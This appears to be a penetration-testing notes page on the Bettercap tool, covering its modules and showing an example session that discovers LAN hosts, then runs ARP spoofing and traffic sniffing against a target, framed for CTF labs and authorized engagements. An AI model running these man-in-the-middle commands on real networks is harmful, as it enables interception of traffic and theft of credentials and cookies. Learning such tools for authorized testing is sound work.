#### Official Documentation: [https://www.bettercap.org/](https://www.bettercap.org/)
#### Cheat Sheet: [[Kali Tools#Bettercap|Bettercap Commands]]
## Purpose
Bettercap is a powerful, modular network attack and monitoring tool. It supports sniffing, MITM, spoofing, credential harvesting, and IoT/ble hacking.

## Scenarios
- CTF: Intercept HTTP traffic or inject payloads on a LAN challenge to steal cookies or credentials.  
- Real world: Demonstrate risks of ARP spoofing, DNS spoofing, and insecure protocols in an authorized engagement.

## All needed info to run
- Start with: `bettercap -iface <iface>`.  
- Interactive shell with modules:
  - `net.probe on` → discover hosts  
  - `net.recon on` → gather more info about devices  
  - `arp.spoof on` → perform ARP poisoning  
  - `net.sniff on` → capture traffic (with filters)  
  - `dns.spoof on` → spoof DNS replies  
- Key commands:
  - `help` → show modules  
  - `set <module.option> <value>` → configure module  
  - `show modules` / `show options` → view available tools and configs  
- Use `bettercap -eval "net.probe on; net.recon on"` for one-liners.

## Example commands & outputs
```bash
# Launch Bettercap on wlan0
$ sudo bettercap -iface wlan0
bettercap v2.32.0 [core] ...
bettercap > help

# Discover hosts
bettercap > net.probe on
bettercap > net.show
# Output:
# 192.168.56.1   08:00:27:ab:cd:ef
# 192.168.56.101 08:00:27:12:34:56

# Run ARP spoofing against target
bettercap > set arp.spoof.targets 192.168.56.101
bettercap > arp.spoof on
bettercap > net.sniff on
```

!!! note "Bettercap Basics"
	- Use `bettercap -iface <iface>` to start; run modules inside interactive shell.
	- `net.probe` + `net.recon` discover hosts; `arp.spoof` + `net.sniff` for MITM.
	- Commands can be chained in `-eval` for quick scripts.
	- MITM attacks are noisy and disruptive — only run in labs or with permission.


### [[Kali Tools#Bettercap|Bettercap Commands]]